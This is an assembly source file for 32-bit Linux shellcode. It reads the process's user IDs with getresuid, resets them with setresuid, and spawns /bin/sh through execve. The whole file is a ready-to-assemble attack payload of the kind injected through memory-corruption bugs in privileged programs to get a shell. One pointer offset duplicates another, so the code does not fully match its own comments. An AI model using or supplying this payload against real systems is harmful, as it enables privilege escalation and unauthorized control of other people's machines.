;; getresuid, setresuid, /bin/sh shellcode for 32 bit linux
;; set real, effective, and saved uid to current effective uid, then serve up shell

BITS 32

    ;; get real, effective, and set uid at known addresses via getresuid()
    mov ebx, esp  ; uid_t *ruid
    mov ecx, esp
    mov edx, esp
    add ecx, 0x04 ; uid_t *euid
    add edx, 0x04 ; uid_t *suid
    
    ; getresuid syscall
    xor eax,eax
    mov al, 0xd1
    int 0x80

    ;; set real, effective, and set uid to obtained values via setresuid()
    mov ebx, DWORD [ebx] ; uid_t ruid
    mov ecx, DWORD [ecx] ; uid_t euid
    mov edx, DWORD [edx] ; uid_t suid

    ; setresuid syscall
    mov al, 0xd0
    int 0x80

    ;; execve("/bin/sh", ["/bin/sh", NULL], [NULL])
    xor eax, eax
    push eax
    mov edx, esp    ; char **envp
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; char *filename
    push eax
    push ebx
    mov ecx, esp    ; char **argv

    ; execve syscall
    mov al, 0x0b
    int 0x80